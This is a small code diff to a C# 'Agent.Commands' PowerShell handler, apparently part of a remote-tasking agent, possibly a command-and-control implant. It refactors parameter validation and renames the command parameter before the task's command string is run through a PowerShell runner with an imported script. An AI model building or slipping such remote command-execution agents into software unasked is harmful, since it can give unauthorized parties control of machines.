@@ -15,13 +15,9 @@ namespace Agent.Commands
         public override CommandId Command => CommandId.Powershell;
         public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            if (!task.HasParameter(ParameterId.Cmd))
-            {
-                context.Error($"Command is mandatory!");
-                return;
-            }
+            task.ThrowIfParameterMissing(ParameterId.Command);
 
-            string command = task.GetParameter<string>(ParameterId.Cmd);
+            string command = task.GetParameter<string>(ParameterId.Command);
             using (var runner = new PowerShellRunner())
             {
                 if (!string.IsNullOrEmpty(PowerShellImportCommand.Script))
